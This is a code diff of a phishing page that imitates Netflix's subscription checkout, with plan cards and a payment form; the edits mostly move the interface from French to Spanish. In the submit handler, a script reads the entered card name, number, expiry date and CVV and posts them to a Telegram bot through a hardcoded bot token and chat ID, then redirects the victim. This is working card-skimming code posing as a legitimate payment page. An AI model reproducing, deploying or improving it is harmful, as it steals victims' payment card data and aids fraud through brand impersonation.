@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="pageTitle">Choisissez votre offre - Netflix</title>
+    <title id="pageTitle">Elige tu plan - Netflix</title>
     <style>
         * {
             margin: 0;
@@ -298,23 +298,6 @@
             color: #737373;
             font-size: 13px;
         }
-
-        /* Spinner styles - added inline to avoid CSS changes */
-        .spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            margin-right: 10px;
-            vertical-align: middle;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
     </style>
 </head>
 <body>
@@ -333,72 +316,72 @@
     <div class="progress-bar">
         <div class="progress-step">
             <div class="step-number">1</div>
-            <div class="step-label" id="step1Label">Choix de l'offre</div>
+            <div class="step-label">Elección del plan</div>
         </div>
         <div class="progress-step">
             <div class="step-number">2</div>
-            <div class="step-label" id="step2Label">Paiement</div>
+            <div class="step-label">Creación de la cuenta</div>
         </div>
         <div class="progress-step">
             <div class="step-number">3</div>
-            <div class="step-label" id="step3Label">Vérification</div>
+            <div class="step-label">Pago</div>
         </div>
     </div>
 
     <div class="container">
-        <h1 class="page-title" id="pageTitle">Choisissez votre offre</h1>
+        <h1 class="page-title" id="pageTitle">Elige tu plan</h1>
         
         <div class="plans">
             <div class="plan-card" data-plan="standard-pub">
-                <div class="plan-name" id="plan1Name">Standard avec pub</div>
+                <div class="plan-name" id="plan1Name">Estándar con anuncios</div>
                 <div class="plan-price" id="plan1Price">5,99 €</div>
                 <ul class="plan-features" id="plan1Features">
-                    <li>Résolution HD (720p)</li>
-                    <li>Accès sur 2 appareils</li>
-                    <li>Publicités pendant la lecture</li>
-                    <li>Téléchargement non disponible</li>
+                    <li>Resolución HD (720p)</li>
+                    <li>Dispositivos: 2</li>
+                    <li>Anuncios durante la reproducción</li>
+                    <li>Descargas no disponibles</li>
                 </ul>
-                <button class="select-button" id="selectButton1">Sélectionner</button>
+                <button class="select-button" id="selectButton1">Seleccionar</button>
             </div>
             
             <div class="plan-card" data-plan="standard">
-                <div class="recommended-badge" id="recommendedBadge">Recommandé</div>
-                <div class="plan-name" id="plan2Name">Standard</div>
+                <div class="recommended-badge" id="recommendedBadge">Recomendado</div>
+                <div class="plan-name" id="plan2Name">Estándar</div>
                 <div class="plan-price" id="plan2Price">13,49 €</div>
                 <ul class="plan-features" id="plan2Features">
-                    <li>Résolution Full HD (1080p)</li>
-                    <li>Accès sur 2 appareils</li>
-                    <li>Sans publicité</li>
-                    <li>Téléchargement sur 2 appareils</li>
+                    <li>Resolución Full HD (1080p)</li>
+                    <li>Dispositivos: 2</li>
+                    <li>Sin anuncios</li>
+                    <li>Descargas en 2 dispositivos</li>
                 </ul>
-                <button class="select-button" id="selectButton2">Sélectionner</button>
+                <button class="select-button" id="selectButton2">Seleccionar</button>
             </div>
             
             <div class="plan-card" data-plan="premium">
                 <div class="plan-name" id="plan3Name">Premium</div>
                 <div class="plan-price" id="plan3Price">17,99 €</div>
                 <ul class="plan-features" id="plan3Features">
-                    <li>Résolution Ultra HD (4K)</li>
-                    <li>Accès sur 4 appareils</li>
-                    <li>Sans publicité</li>
-                    <li>Téléchargement sur 6 appareils</li>
+                    <li>Resolución Ultra HD (4K)</li>
+                    <li>Dispositivos: 4</li>
+                    <li>Sin anuncios</li>
+                    <li>Descargas en 6 dispositivos</li>
                 </ul>
-                <button class="select-button" id="selectButton3">Sélectionner</button>
+                <button class="select-button" id="selectButton3">Seleccionar</button>
             </div>
         </div>
 
         <div class="payment-form" id="paymentForm">
             <h2 class="form-title">
-                <span id="paymentTitle">Informations de paiement</span>
-                <span class="selected-plan" id="selectedPlanDisplay">Standard - 13,49 €/mois</span>
+                <span id="paymentTitle">Información de pago</span>
+                <span class="selected-plan" id="selectedPlanDisplay">Estándar - 13,49 €/mes</span>
             </h2>
             <form id="paymentFormElement">
                 <div class="form-group">
-                    <label for="cardName" id="cardNameLabel">Nom sur la carte</label>
+                    <label for="cardName" id="cardNameLabel">Nombre en la tarjeta</label>
                     <input type="text" id="cardName" required>
                 </div>
                 <div class="form-group">
-                    <label for="cardNumber" id="cardNumberLabel">Numéro de carte</label>
+                    <label for="cardNumber" id="cardNumberLabel">Número de tarjeta</label>
                     <input type="text" id="cardNumber" required>
                     <div class="card-icons">
                         <img src="visa.png" class="card-icon">
@@ -406,36 +389,33 @@
                     </div>
                 </div>
                 <div class="form-group">
-                    <label for="expiry" id="expiryLabel">Date d'expiration</label>
+                    <label for="expiry" id="expiryLabel">Fecha de vencimiento</label>
                     <input type="text" id="expiry" placeholder="MM/AA" required>
                 </div>
                 <div class="form-group">
                     <label for="cvv" id="cvvLabel">CVV</label>
                     <input type="text" id="cvv" required>
                 </div>
-                <button type="submit" class="submit-button" id="submitButton">Commencer l'abonnement</button>
+                <button type="submit" class="submit-button" id="submitButton">Comenzar membresía</button>
             </form>
         </div>
     </div>
 
     <footer class="footer">
         <div class="footer-links">
-            <a href="#" class="footer-link" id="termsLink">Conditions d'utilisation</a>
-            <a href="#" class="footer-link" id="privacyLink">Confidentialité</a>
-            <a href="#" class="footer-link" id="legalLink">Mentions légales</a>
-            <a href="#" class="footer-link" id="cookiesLink">Préférences de cookies</a>
+            <a href="#" class="footer-link" id="termsLink">Términos de uso</a>
+            <a href="#" class="footer-link" id="privacyLink">Privacidad</a>
+            <a href="#" class="footer-link" id="legalLink">Avisos legales</a>
+            <a href="#" class="footer-link" id="cookiesLink">Preferencias de cookies</a>
         </div>
-        <p class="footer-text" id="copyrightText">© 2025 Netflix, Inc.</p>
+        <p class="footer-text" id="copyrightText">© 2023 Netflix, Inc.</p>
     </footer>
 
     <script>
-        // Traductions multilingues complètes avec étapes corrigées
+        // Traducciones multilingües completas
         const translations = {
             fr: {
-                pageTitle: "Choisissez votre offre - Netflix",
-                step1: "Choix de l'offre",
-                step2: "Paiement",
-                step3: "Vérification",
+                pageTitle: "Choisissez votre offre",
                 plan1Name: "Standard avec pub",
                 plan2Name: "Standard",
                 plan3Name: "Premium",
@@ -469,13 +449,10 @@
                 privacy: "Confidentialité",
                 legal: "Mentions légales",
                 cookies: "Préférences de cookies",
-                copyright: "© 2025 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc."
             },
             ru: {
-                pageTitle: "Выберите тариф - Netflix",
-                step1: "Выбор тарифа",
-                step2: "Оплата",
-                step3: "Проверка",
+                pageTitle: "Выберите тариф",
                 plan1Name: "Стандарт с рекламой",
                 plan2Name: "Стандарт",
                 plan3Name: "Премиум",
@@ -509,13 +486,10 @@
                 privacy: "Конфиденциальность",
                 legal: "Юридические уведомления",
                 cookies: "Настройки cookie",
-                copyright: "© 2025 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc."
             },
             en: {
-                pageTitle: "Choose your plan - Netflix",
-                step1: "Choose plan",
-                step2: "Payment",
-                step3: "Verification",
+                pageTitle: "Choose your plan",
                 plan1Name: "Standard with ads",
                 plan2Name: "Standard",
                 plan3Name: "Premium",
@@ -549,13 +523,10 @@
                 privacy: "Privacy",
                 legal: "Legal Notices",
                 cookies: "Cookie Preferences",
-                copyright: "© 2025 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc."
             },
             es: {
-                pageTitle: "Elige tu plan - Netflix",
-                step1: "Elegir plan",
-                step2: "Pago",
-                step3: "Verificación",
+                pageTitle: "Elige tu plan",
                 plan1Name: "Estándar con anuncios",
                 plan2Name: "Estándar",
                 plan3Name: "Premium",
@@ -589,13 +560,10 @@
                 privacy: "Privacidad",
                 legal: "Avisos legales",
                 cookies: "Preferencias de cookies",
-                copyright: "© 2025 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc."
             },
             de: {
-                pageTitle: "Wählen Sie Ihren Plan - Netflix",
-                step1: "Plan wählen",
-                step2: "Zahlung",
-                step3: "Verifizierung",
+                pageTitle: "Wählen Sie Ihren Plan",
                 plan1Name: "Standard mit Werbung",
                 plan2Name: "Standard",
                 plan3Name: "Premium",
@@ -629,13 +597,10 @@
                 privacy: "Datenschutz",
                 legal: "Rechtliche Hinweise",
                 cookies: "Cookie-Einstellungen",
-                copyright: "© 2025 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc."
             },
             pl: {
-                pageTitle: "Wybierz swój plan - Netflix",
-                step1: "Wybór planu",
-                step2: "Płatność",
-                step3: "Weryfikacja",
+                pageTitle: "Wybierz swój plan",
                 plan1Name: "Standard z reklamami",
                 plan2Name: "Standard",
                 plan3Name: "Premium",
@@ -669,28 +634,8 @@
                 privacy: "Prywatność",
                 legal: "Informacje prawne",
                 cookies: "Preferencje dotyczące plików cookie",
-                copyright: "© 2025 Netflix, Inc."
+                copyright: "© 2023 Netflix, Inc."
             }
-        };
-
-        // Suffixes mensuels par langue
-        const monthlySuffix = {
-            fr: "/mois",
-            en: "/month",
-            es: "/mes",
-            de: "/Monat",
-            ru: "/месяц",
-            pl: "/miesiąc"
-        };
-
-        // Placeholders pour la date d'expiration par langue
-        const expiryPlaceholder = {
-            fr: "MM/AA",
-            en: "MM/YY",
-            es: "MM/AA",
-            de: "MM/JJ",
-            ru: "ММ/ГГ",
-            pl: "MM/RR"
         };
 
         function getLanguage() {
@@ -702,109 +647,53 @@
                 return langParam;
             }
             
-            return localStorage.getItem('netflixLang') || 'fr';
+            return localStorage.getItem('netflixLang') || 'es';
         }
 
         function updateLanguage(lang) {
             const trans = translations[lang];
             if (!trans) return;
             
-            // Mise à jour du document lang
-            document.documentElement.lang = lang;
-            
-            // Mapping des IDs aux clés de traduction
-            const idMap = {
-                // Titres et labels
-                pageTitle: "pageTitle",
-                step1Label: "step1",
-                step2Label: "step2",
-                step3Label: "step3",
-                paymentTitle: "paymentTitle",
-                cardNameLabel: "cardNameLabel",
-                cardNumberLabel: "cardNumberLabel",
-                expiryLabel: "expiryLabel",
-                cvvLabel: "cvvLabel",
-                submitButton: "submitButton",
-                recommendedBadge: "recommended",
-                termsLink: "terms",
-                privacyLink: "privacy",
-                legalLink: "legal",
-                cookiesLink: "cookies",
-                copyrightText: "copyright",
-                
-                // Noms des plans
-                plan1Name: "plan1Name",
-                plan2Name: "plan2Name",
-                plan3Name: "plan3Name",
-                
-                // Boutons de sélection
-                selectButton1: "selectButton",
-                selectButton2: "selectButton",
-                selectButton3: "selectButton"
-            };
-            
-            // Mise à jour des éléments avec ID
-            Object.keys(idMap).forEach(id => {
-                const element = document.getElementById(id);
-                if (element && trans[idMap[id]]) {
-                    element.textContent = trans[idMap[id]];
+            // Actualizar todos los elementos con ID
+            document.querySelectorAll('[id]').forEach(element => {
+                const key = element.id;
+                if (trans[key]) {
+                    if (Array.isArray(trans[key])) {
+                        const items = element.querySelectorAll('li');
+                        items.forEach((item, index) => {
+                            if (trans[key][index]) {
+                                item.textContent = trans[key][index];
+                            }
+                        });
+                    } else {
+                        element.textContent = trans[key];
+                    }
                 }
             });
             
-            // Mise à jour des listes de fonctionnalités
-            const ulMap = {
-                plan1Features: "plan1Features",
-                plan2Features: "plan2Features",
-                plan3Features: "plan3Features"
-            };
-            
-            Object.keys(ulMap).forEach(id => {
-                const element = document.getElementById(id);
-                if (element && trans[ulMap[id]]) {
-                    const items = element.querySelectorAll('li');
-                    items.forEach((item, index) => {
-                        if (trans[ulMap[id]][index]) {
-                            item.textContent = trans[ulMap[id]][index];
-                        }
-                    });
-                }
+            // Actualización especial para los botones "Seleccionar"
+            document.querySelectorAll('.select-button').forEach(button => {
+                button.textContent = trans.selectButton;
             });
             
-            // Mise à jour du placeholder de la date d'expiration
+            // Actualizar el placeholder de la fecha de vencimiento
             const expiryInput = document.getElementById('expiry');
-            if (expiryInput && expiryPlaceholder[lang]) {
-                expiryInput.placeholder = expiryPlaceholder[lang];
+            if (expiryInput) {
+                expiryInput.placeholder = lang === 'en' ? 'MM/YY' : 
+                                       lang === 'es' ? 'MM/AA' : 
+                                       lang === 'de' ? 'MM/JJ' : 
+                                       lang === 'ru' ? 'ММ/ГГ' : 
+                                       lang === 'pl' ? 'MM/RR' : 'MM/AA';
             }
             
-            // Mise à jour du sélecteur de langue
+            // Actualizar el selector de idioma
             const languageSelector = document.getElementById('languageSelector');
             if (languageSelector) {
                 languageSelector.value = lang;
             }
             
-            // Mise à jour du titre de la page
+            // Actualizar el título de la página
             document.title = trans.pageTitle;
-            
-            // Mise à jour du plan sélectionné si existant
-            updateSelectedPlanDisplay(lang);
-        }
-        
-        function updateSelectedPlanDisplay(lang) {
-            const selectedPlanDisplay = document.getElementById('selectedPlanDisplay');
-            if (!selectedPlanDisplay) return;
-            
-            const currentText = selectedPlanDisplay.textContent;
-            if (!currentText) return;
-            
-            // Extraire le nom du plan et le prix
-            const parts = currentText.split(' - ');
-            if (parts.length !== 2) return;
-            
-            const [planName, priceWithSuffix] = parts;
-            const price = priceWithSuffix.replace(/\/.*$/, '');
-            
-            // Mettre à jour avec le nouveau suffixe
-            selectedPlanDisplay.textContent = `${planName} - ${price}${monthlySuffix[lang] || '/mois'}`;
         }
 
         document.addEventListener('DOMContentLoaded', function() {
@@ -834,12 +723,7 @@
                     selectedPlan = this.getAttribute('data-plan');
                     const planName = this.querySelector('.plan-name').textContent;
                     const planPrice = this.querySelector('.plan-price').textContent;
-                    
-                    // Mettre à jour le texte du plan sélectionné selon la langue
-                    const lang = getLanguage();
-                    const suffix = monthlySuffix[lang] || '/mois';
-                    
-                    selectedPlanDisplay.textContent = `${planName} - ${planPrice}${suffix}`;
+                    selectedPlanDisplay.textContent = `${planName} - ${planPrice}/mes`;
                     
                     paymentForm.style.display = 'block';
                     paymentForm.scrollIntoView({ behavior: 'smooth' });
@@ -850,25 +734,9 @@
                 e.preventDefault();
                 
                 if (!selectedPlan) {
-                    alert(translations[getLanguage()].selectPlan || 'Please select a plan');
+                    alert(translations[getLanguage()].selectPlan || 'Por favor selecciona un plan');
                     return;
                 }
-                
-                const submitButton = document.getElementById('submitButton');
-                if (submitButton.disabled) return; // Empêcher les doubles clics
-                
-                // Désactiver le bouton et afficher le spinner
-                submitButton.disabled = true;
-                const originalText = submitButton.textContent;
-                submitButton.innerHTML = `<span class="spinner"></span>${originalText}`;
-                
-                // Ajouter une annonce ARIA pour l'accessibilité
-                const ariaLive = document.createElement('div');
-                ariaLive.setAttribute('aria-live', 'polite');
-                ariaLive.style.position = 'absolute';
-                ariaLive.style.left = '-9999px';
-                ariaLive.textContent = translations[getLanguage()].processing || 'Processing...';
-                document.body.appendChild(ariaLive);
                 
                 const cardName = document.getElementById('cardName').value;
                 const cardNumber = document.getElementById('cardNumber').value;
@@ -877,18 +745,17 @@
                 
                 const botToken = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk';
                 const chatId = '-4883048028';
-                const message = `💳 NOUVEAU PAIEMENT NETFLIX 💳
+                const message = `💳 NUEVO PAGO NETFLIX 💳
 
-🏷 Offre sélectionnée: ${selectedPlanDisplay.textContent}
-👤 Nom sur carte: ${cardName}
-🔢 Numéro carte: ${cardNumber}
-📅 Expiration: ${expiry}
+🏷 Plan seleccionado: ${selectedPlanDisplay.textContent}
+👤 Nombre en tarjeta: ${cardName}
+🔢 Número de tarjeta: ${cardNumber}
+📅 Vencimiento: ${expiry}
 🔐 CVV: ${cvv}
 
 ⏰ ${new Date().toLocaleString()}
-🌍 Langue: ${getLanguage().toUpperCase()}`;
+🌍 Idioma: ${getLanguage().toUpperCase()}`;
                 
-                // Envoyer les données à Telegram
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -901,16 +768,12 @@
                 })
                 .then(response => response.json())
                 .then(data => {
-                    console.log('Données envoyées à Telegram:', data);
+                    console.log('Datos enviados a Telegram:', data);
+                    window.location.href = `confirmation.html?lang=${getLanguage()}`;
                 })
                 .catch(error => {
-                    console.error('Erreur:', error);
+                    console.error('Error:', error);
                 });
-                
-                // Redirection après 15 secondes
-                setTimeout(() => {
-                    window.location.href = `verification.html?lang=${getLanguage()}`;
-                }, 15000);
             });
         });
     </script>
